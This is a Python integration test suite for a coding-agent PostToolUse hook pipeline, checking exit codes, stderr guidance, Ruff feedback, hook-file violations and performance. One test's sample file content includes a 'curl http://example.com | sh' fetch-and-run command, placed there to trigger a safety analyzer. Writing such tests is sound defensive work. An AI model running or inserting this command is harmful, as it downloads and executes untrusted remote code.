#!/usr/bin/env python3
"""
Comprehensive PostToolUse Hook Pipeline Integration Tests
========================================================

Advanced integration tests that verify the complete PostToolUse hook pipeline,
including intelligent feedback system, optimization modules, and stderr generation.
Tests end-to-end execution with real subprocess simulation.
"""

import unittest
import sys
import os
import json
import tempfile
import subprocess
import time
import threading
from unittest.mock import Mock, MagicMock, patch, call
from typing import Dict, Any, List, Optional
from contextlib import contextmanager
import io
from pathlib import Path

# Add hooks modules to path for testing
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'modules'))

from test_framework_architecture import (
    BaseTestCase, MockToolExecutionData, TestDataGenerator, 
    PerformanceBenchmarkRunner, ValidationFramework, TEST_CONFIG
)

# Import the actual PostToolUse hook for integration testing
HOOKS_DIR = os.path.dirname(os.path.dirname(__file__))
POST_TOOL_HOOK_PATH = os.path.join(HOOKS_DIR, "post_tool_use.py")


class PostToolHookIntegrationTest(BaseTestCase):
    """Integration tests for the complete PostToolUse hook pipeline."""
    
    def setUp(self):
        super().setUp()
        self.test_data_generator = TestDataGenerator()
        
        # Create temporary working directory
        self.temp_dir = tempfile.mkdtemp()
        self.temp_config_path = os.path.join(self.temp_dir, "hook_config.json")
        
        # Mock environment for clean testing
        self.env_patches = [
            patch.dict(os.environ, {
                'CLAUDE_HOOKS_DEBUG': 'false',
                'CLAUDE_RUFF_AUTOFIX': 'false',
                'PYTHONPATH': os.path.dirname(HOOKS_DIR)
            })
        ]
        for env_patch in self.env_patches:
            env_patch.start()
    
    def tearDown(self):
        super().tearDown()
        # Stop environment patches
        for env_patch in self.env_patches:
            env_patch.stop()
        
        # Clean up temporary files
        import shutil
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    @contextmanager
    def run_hook_subprocess(self, input_data: Dict[str, Any], timeout: float = 10.0):
        """Run the PostToolUse hook as a subprocess with real input."""
        try:
            process = subprocess.Popen(
                [sys.executable, POST_TOOL_HOOK_PATH],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                cwd=HOOKS_DIR
            )
            
            # Send input and get results
            stdout, stderr = process.communicate(
                input=json.dumps(input_data),
                timeout=timeout
            )
            
            yield {
                'returncode': process.returncode,
                'stdout': stdout,
                'stderr': stderr,
                'process': process
            }
            
        except subprocess.TimeoutExpired:
            process.kill()
            stdout, stderr = process.communicate()
            yield {
                'returncode': -1,
                'stdout': stdout,
                'stderr': stderr,
                'process': process,
                'timeout': True
            }
    
    def test_successful_tool_execution_pipeline(self):
        """Test complete pipeline for successful tool execution."""
        # Create a successful Read tool execution
        tool_data = {
            "tool_name": "Read",
            "tool_input": {"file_path": "/home/devcontainers/flowed/README.md"},
            "tool_response": {
                "success": True,
                "content": "Sample file content",
                "duration": 0.05
            },
            "start_time": time.time() - 0.05
        }
        
        with self.run_hook_subprocess(tool_data) as result:
            # Should complete successfully without blocking
            self.assertEqual(result['returncode'], 0, "Successful tool should not be blocked")
            
            # Should have minimal stderr output for successful operations
            stderr_lines = result['stderr'].strip().split('\n')
            guidance_lines = [line for line in stderr_lines if any(
                indicator in line for indicator in ['ðŸš¨', 'ðŸ‘‘', 'ðŸ’¡', 'âš¡']
            )]
            self.assertLessEqual(len(guidance_lines), 2, "Successful operations should generate minimal guidance")
    
    def test_intelligent_feedback_system_integration(self):
        """Test integration of the intelligent feedback system."""
        # Create a Python file write operation that should trigger intelligent feedback
        tool_data = {
            "tool_name": "Write",
            "tool_input": {
                "file_path": "/home/devcontainers/flowed/test_sample.py",
                "content": "import os\ndef hello():\n    print('Hello')\n"
            },
            "tool_response": {
                "success": True,
                "duration": 0.12
            },
            "start_time": time.time() - 0.12
        }
        
        with self.run_hook_subprocess(tool_data) as result:
            # Should provide intelligent feedback
            self.assertIn(result['returncode'], [0, 2], "Should complete with optional feedback")
            
            stderr_content = result['stderr']
            
            # Should contain intelligent feedback indicators
            if "CLAUDE CODE INTELLIGENCE" in stderr_content:
                self.assertIn("CLAUDE CODE INTELLIGENCE", stderr_content)
                # Should provide contextual suggestions
                self.assertTrue(
                    any(keyword in stderr_content.lower() for keyword in 
                        ['mcp', 'coordination', 'optimization', 'consider']),
                    "Should provide actionable suggestions"
                )
    
    def test_hook_file_violation_detection(self):
        """Test detection and blocking of hook file violations."""
        # Create a hook file with sys.path manipulation
        tool_data = {
            "tool_name": "Write",
            "tool_input": {
                "file_path": "/home/devcontainers/flowed/.claude/hooks/test_violation.py",
                "content": """#!/usr/bin/env python3
import sys
sys.path.insert(0, '/some/path')  # This should be blocked

def test_function():
    pass
"""
            },
            "tool_response": {"success": True},
            "start_time": time.time()
        }
        
        with self.run_hook_subprocess(tool_data) as result:
            # Should block the operation
            self.assertEqual(result['returncode'], 1, "Should block hook file violations")
            
            stderr_content = result['stderr']
            self.assertIn("HOOK FILE VIOLATION DETECTED", stderr_content)
            self.assertIn("sys.path manipulations are not allowed", stderr_content)
            self.assertIn("path_resolver", stderr_content)
    
    def test_ruff_integration_and_feedback(self):
        """Test Ruff integration for code quality feedback."""
        # Create a Python file with code quality issues
        temp_py_file = os.path.join(self.temp_dir, "quality_test.py")
        problematic_code = """
import os, sys   # Multiple imports on one line (E401)
def bad_function(   ):  # Extra spaces in function definition
    unused_variable = 42  # Unused variable (F841)
    print("hello world")
"""
        
        # Write the file first
        with open(temp_py_file, 'w') as f:
            f.write(problematic_code)
        
        tool_data = {
            "tool_name": "Write",
            "tool_input": {
                "file_path": temp_py_file,
                "content": problematic_code
            },
            "tool_response": {"success": True},
            "start_time": time.time()
        }
        
        with self.run_hook_subprocess(tool_data, timeout=15.0) as result:
            # Should provide feedback (exit code 2) if Ruff is available
            self.assertIn(result['returncode'], [0, 2], "Should complete with optional Ruff feedback")
            
            stderr_content = result['stderr']
            
            # If Ruff feedback is provided, it should be properly formatted
            if "RUFF CODE QUALITY FEEDBACK" in stderr_content:
                self.assertIn("RUFF CODE QUALITY FEEDBACK", stderr_content)
                self.assertIn("QUICK FIXES:", stderr_content)
                self.assertTrue(
                    "ruff check" in stderr_content or "ruff format" in stderr_content,
                    "Should provide Ruff command suggestions"
                )
    
    def test_workflow_pattern_detection(self):
        """Test detection of workflow patterns and optimization suggestions."""
        # Create a sequence that should trigger workflow optimization
        sequential_tools = [
            {
                "tool_name": "Task",
                "tool_input": {"task": "Create component 1"},
                "tool_response": {"success": True},
                "start_time": time.time()
            },
            {
                "tool_name": "Task", 
                "tool_input": {"task": "Create component 2"},
                "tool_response": {"success": True},
                "start_time": time.time()
            },
            {
                "tool_name": "Task",
                "tool_input": {"task": "Create component 3"},
                "tool_response": {"success": True},
                "start_time": time.time()
            }
        ]
        
        for tool_data in sequential_tools:
            with self.run_hook_subprocess(tool_data) as result:
                stderr_content = result['stderr']
                
                # Later tools should trigger workflow optimization suggestions
                if "Workflow Optimization" in stderr_content or "coordination" in stderr_content.lower():
                    self.assertTrue(
                        any(keyword in stderr_content.lower() for keyword in 
                            ['swarm', 'mcp', 'coordination', 'parallel']),
                        "Should suggest coordination improvements"
                    )
                    break
    
    def test_performance_under_load(self):
        """Test hook performance under simulated load conditions."""
        # Generate multiple tool executions
        load_scenarios = []
        
        # Mix of different tool types
        tool_types = ["Read", "Write", "Edit", "Bash", "Glob"]
        for i in range(20):  # 20 operations
            tool_type = tool_types[i % len(tool_types)]
            
            if tool_type == "Read":
                tool_data = MockToolExecutionData.get_read_execution()
            elif tool_type == "Write":
                tool_data = {
                    "tool_name": "Write",
                    "tool_input": {
                        "file_path": f"/tmp/test_file_{i}.py",
                        "content": f"# Test file {i}\nprint('hello {i}')\n"
                    },
                    "tool_response": {"success": True, "duration": 0.02},
                    "start_time": time.time()
                }
            elif tool_type == "Bash":
                tool_data = {
                    "tool_name": "Bash",
                    "tool_input": {"command": f"echo 'test {i}'"},
                    "tool_response": {"success": True, "output": f"test {i}"},
                    "start_time": time.time()
                }
            else:
                tool_data = MockToolExecutionData.get_zen_chat_execution()
            
            load_scenarios.append(tool_data)
        
        # Execute all scenarios and measure performance
        start_time = time.time()
        successful_executions = 0
        total_stderr_length = 0
        
        for tool_data in load_scenarios:
            with self.run_hook_subprocess(tool_data, timeout=5.0) as result:
                if not result.get('timeout', False):
                    successful_executions += 1
                    total_stderr_length += len(result['stderr'])
        
        total_time = time.time() - start_time
        avg_time_per_tool = (total_time / len(load_scenarios)) * 1000  # Convert to ms
        
        # Performance assertions
        self.assertGreaterEqual(successful_executions, len(load_scenarios) * 0.9, 
                               "Should successfully process 90%+ of tools under load")
        
        self.assertLess(avg_time_per_tool, 200, 
                       "Should process each tool in under 200ms on average under load")
        
        # Stderr output should remain reasonable
        avg_stderr_per_tool = total_stderr_length / max(successful_executions, 1)
        self.assertLess(avg_stderr_per_tool, 1000, 
                       "Should not generate excessive stderr per tool")
    
    def test_error_handling_and_recovery(self):
        """Test hook error handling and recovery mechanisms."""
        # Test with malformed input
        malformed_inputs = [
            {},  # Empty input
            {"tool_name": None},  # Null tool name
            {"tool_name": "InvalidTool", "tool_input": None},  # Null input
            {"tool_name": "Write", "tool_input": {"file_path": None}},  # Invalid file path
        ]
        
        for malformed_input in malformed_inputs:
            with self.run_hook_subprocess(malformed_input, timeout=5.0) as result:
                # Should not crash or hang
                self.assertFalse(result.get('timeout', False), 
                               "Should not timeout on malformed input")
                
                # Should exit gracefully (0 for no action needed, or other appropriate codes)
                self.assertIn(result['returncode'], [0, 1, 2], 
                             "Should exit with appropriate code for malformed input")
    
    def test_memory_integration_functionality(self):
        """Test memory integration capture functionality."""
        # Create a tool execution that should trigger memory capture
        tool_data = {
            "tool_name": "mcp__zen__chat",
            "tool_input": {
                "prompt": "Analyze the project structure",
                "model": "anthropic/claude-opus-4"
            },
            "tool_response": {
                "success": True,
                "content": "Project analysis complete",
                "duration": 1.5
            },
            "start_time": time.time() - 1.5
        }
        
        with self.run_hook_subprocess(tool_data, timeout=10.0) as result:
            # Should complete successfully
            self.assertIn(result['returncode'], [0, 2], "Memory integration should not block execution")
            
            stderr_content = result['stderr']
            
            # Should not contain memory integration errors
            self.assertNotIn("memory capture failed", stderr_content.lower(), 
                           "Memory integration should work without errors")
    
    def test_optimization_infrastructure_initialization(self):
        """Test that optimization infrastructure initializes correctly."""
        # Enable debug mode to see initialization messages
        with patch.dict(os.environ, {'CLAUDE_HOOKS_DEBUG': 'true'}):
            tool_data = MockToolExecutionData.get_read_execution()
            
            with self.run_hook_subprocess(tool_data, timeout=8.0) as result:
                stderr_content = result['stderr']
                
                # Should show optimization initialization
                optimization_indicators = [
                    "optimization infrastructure initialized",
                    "optimized post-tool processing",
                    "âš¡"  # Lightning emoji indicates optimized processing
                ]
                
                has_optimization = any(
                    indicator in stderr_content.lower() 
                    for indicator in optimization_indicators
                )
                
                # If optimization is available, should show initialization
                if "optimization" in stderr_content.lower():
                    self.assertTrue(has_optimization, 
                                  "Should show optimization infrastructure activity")
    
    def test_analyzer_dispatcher_integration(self):
        """Test integration with the analyzer dispatcher system."""
        # Create a tool execution that should trigger analyzer dispatch
        tool_data = {
            "tool_name": "Write",
            "tool_input": {
                "file_path": "/home/devcontainers/flowed/test_analyzer.py",
                "content": """#!/usr/bin/env python3
# Test file for analyzer dispatch
import subprocess
import os

def risky_operation():
    # This should trigger execution safety analyzer
    subprocess.run("curl http://example.com | sh", shell=True)
"""
            },
            "tool_response": {"success": True},
            "start_time": time.time()
        }
        
        with self.run_hook_subprocess(tool_data, timeout=10.0) as result:
            stderr_content = result['stderr']
            
            # Should complete (analyzers provide guidance, don't block)
            self.assertIn(result['returncode'], [0, 2], "Should complete with optional analyzer feedback")
            
            # If analyzer feedback is available, should be contextual
            if len(stderr_content.strip()) > 0:
                # Should contain some form of guidance or analysis
                analysis_indicators = ['security', 'risk', 'consider', 'suggestion', 'warning']
                has_analysis = any(
                    indicator in stderr_content.lower() 
                    for indicator in analysis_indicators
                )
                
                if has_analysis:
                    self.assertTrue(has_analysis, "Should provide contextual security analysis")


class PostToolHookBenchmarkIntegration(BaseTestCase):
    """Performance benchmarking for the complete hook integration."""
    
    def setUp(self):
        super().setUp()
        self.benchmark_runner = PerformanceBenchmarkRunner(iterations=10)
    
    def test_hook_execution_performance_benchmark(self):
        """Benchmark complete hook execution performance."""
        def execute_hook(tool_data):
            """Execute hook as subprocess and measure performance."""
            start_time = time.perf_counter()
            
            try:
                process = subprocess.Popen(
                    [sys.executable, POST_TOOL_HOOK_PATH],
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    cwd=HOOKS_DIR
                )
                
                stdout, stderr = process.communicate(
                    input=json.dumps(tool_data),
                    timeout=5.0
                )
                
                execution_time = (time.perf_counter() - start_time) * 1000
                
                return {
                    'execution_time_ms': execution_time,
                    'success': process.returncode in [0, 2],
                    'returncode': process.returncode,
                    'stderr_length': len(stderr),
                    'stdout_length': len(stdout)
                }
                
            except subprocess.TimeoutExpired:
                return {
                    'execution_time_ms': 5000,  # Timeout
                    'success': False,
                    'timeout': True
                }
            except Exception as e:
                return {
                    'execution_time_ms': float('inf'),
                    'success': False,
                    'error': str(e)
                }
        
        # Test different tool types
        test_scenarios = [
            MockToolExecutionData.get_read_execution(),
            MockToolExecutionData.get_write_execution(),
            MockToolExecutionData.get_bash_execution(),
            MockToolExecutionData.get_zen_chat_execution(),
        ]
        
        results = []
        for scenario in test_scenarios:
            for _ in range(self.benchmark_runner.iterations):
                result = execute_hook(scenario)
                results.append(result)
        
        # Calculate performance metrics
        successful_results = [r for r in results if r['success']]
        if successful_results:
            avg_execution_time = sum(r['execution_time_ms'] for r in successful_results) / len(successful_results)
            max_execution_time = max(r['execution_time_ms'] for r in successful_results)
            success_rate = len(successful_results) / len(results)
            
            # Performance assertions
            self.assertGreater(success_rate, 0.9, "Hook should have >90% success rate")
            self.assertLess(avg_execution_time, 500, "Average execution should be under 500ms")
            self.assertLess(max_execution_time, 2000, "Maximum execution should be under 2000ms")
        
        # Memory usage should be reasonable
        avg_stderr_length = sum(r.get('stderr_length', 0) for r in successful_results) / max(len(successful_results), 1)
        self.assertLess(avg_stderr_length, 2000, "Average stderr should be under 2000 characters")


class PostToolHookEndToEndValidation(BaseTestCase):
    """End-to-end validation of the complete hook system."""
    
    def test_complete_development_workflow_simulation(self):
        """Simulate a complete development workflow through the hook system."""
        # Simulate a realistic development sequence
        workflow_steps = [
            # 1. Read project files
            {
                "tool_name": "Read",
                "tool_input": {"file_path": "/home/devcontainers/flowed/package.json"},
                "tool_response": {"success": True, "content": '{"name": "test"}'},
                "start_time": time.time()
            },
            
            # 2. Create new file
            {
                "tool_name": "Write", 
                "tool_input": {
                    "file_path": "/tmp/new_component.py",
                    "content": "# New component\nclass MyComponent:\n    pass\n"
                },
                "tool_response": {"success": True},
                "start_time": time.time()
            },
            
            # 3. Run command
            {
                "tool_name": "Bash",
                "tool_input": {"command": "echo 'Building project...'"},
                "tool_response": {"success": True, "output": "Building project..."},
                "start_time": time.time()
            },
            
            # 4. Use MCP coordination
            {
                "tool_name": "mcp__zen__analyze",
                "tool_input": {
                    "step": "Analyze project structure",
                    "step_number": 1,
                    "total_steps": 3,
                    "next_step_required": True,
                    "findings": "Project structure analysis initiated",
                    "model": "anthropic/claude-opus-4"
                },
                "tool_response": {"success": True},
                "start_time": time.time()
            }
        ]
        
        workflow_results = []
        total_guidance_provided = 0
        
        for i, step in enumerate(workflow_steps):
            with self.run_hook_subprocess(step, timeout=10.0) as result:
                workflow_results.append({
                    'step': i + 1,
                    'tool_name': step['tool_name'],
                    'returncode': result['returncode'],
                    'stderr_length': len(result['stderr']),
                    'timeout': result.get('timeout', False)
                })
                
                # Count guidance provided
                if result['returncode'] == 2:  # Guidance provided
                    total_guidance_provided += 1
        
        # Validate workflow execution
        successful_steps = sum(1 for r in workflow_results if r['returncode'] in [0, 2] and not r.get('timeout'))
        success_rate = successful_steps / len(workflow_steps)
        
        self.assertGreaterEqual(success_rate, 0.95, "Workflow should have very high success rate")
        self.assertLessEqual(total_guidance_provided, len(workflow_steps), 
                           "Should not provide excessive guidance")
        
        # Should provide some optimization guidance for complex workflows
        if total_guidance_provided > 0:
            self.assertGreaterEqual(total_guidance_provided, 1, "Should provide helpful guidance")
    
    def run_hook_subprocess(self, input_data: Dict[str, Any], timeout: float = 10.0):
        """Helper method for subprocess execution."""
        return PostToolHookIntegrationTest.run_hook_subprocess(self, input_data, timeout)


if __name__ == '__main__':
    # Configure test environment
    import logging
    logging.basicConfig(level=logging.INFO)
    
    # Create comprehensive test suite
    suite = unittest.TestSuite()
    
    # Add integration tests
    suite.addTest(unittest.makeSuite(PostToolHookIntegrationTest))
    suite.addTest(unittest.makeSuite(PostToolHookBenchmarkIntegration))
    suite.addTest(unittest.makeSuite(PostToolHookEndToEndValidation))
    
    # Run tests with detailed output
    runner = unittest.TextTestRunner(verbosity=2, stream=sys.stdout)
    result = runner.run(suite)
    
    # Exit with appropriate code
    sys.exit(0 if result.wasSuccessful() else 1)